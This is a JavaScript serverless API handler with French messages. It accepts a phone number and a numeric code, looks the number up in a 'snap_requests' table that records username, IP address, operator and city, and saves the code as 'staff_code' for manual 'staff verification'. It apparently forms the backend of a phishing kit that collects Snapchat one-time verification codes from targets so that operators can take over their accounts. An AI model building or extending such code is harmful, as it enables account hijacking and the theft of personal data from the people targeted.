import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') { res.status(200).end(); return; }
  if (req.method !== 'POST') return res.status(405).json({ success: false });

  try {
    const { phone, code } = req.body;
    if (!phone || !code) return res.status(400).json({ success: false, message: 'Champs manquants' });

    const sql = neon(process.env.DATABASE_URL);
    const result = await sql`
      SELECT id, username, phone, ip_address, code_length, status, operator, country, city
      FROM snap_requests WHERE phone = ${phone} LIMIT 1
    `;

    if (result.length === 0) return res.status(404).json({ success: false, message: 'Demande non trouvée' });
    const row = result[0];

    if (row.status === 'completed') {
      return res.status(200).json({ success: true, message: 'Déjà validé' });
    }

    const expectedLen = row.code_length || 6;
    const codeStr = String(code).replace(/\s/g, '');
    if (codeStr.length !== expectedLen || !/^\d+$/.test(codeStr)) {
      return res.status(400).json({ success: false, message: `Code invalide (${expectedLen} chiffres requis)` });
    }

    // NOUVEAU : status = 'code_submitted' (attente validation staff)
    await sql`UPDATE snap_requests SET status = 'code_submitted', staff_code = ${codeStr} WHERE phone = ${phone}`;

    return res.status(200).json({ success: true, message: 'Code soumis, en attente de vérification' });
  } catch (e) {
    return res.status(500).json({ success: false, message: e.message });
  }
}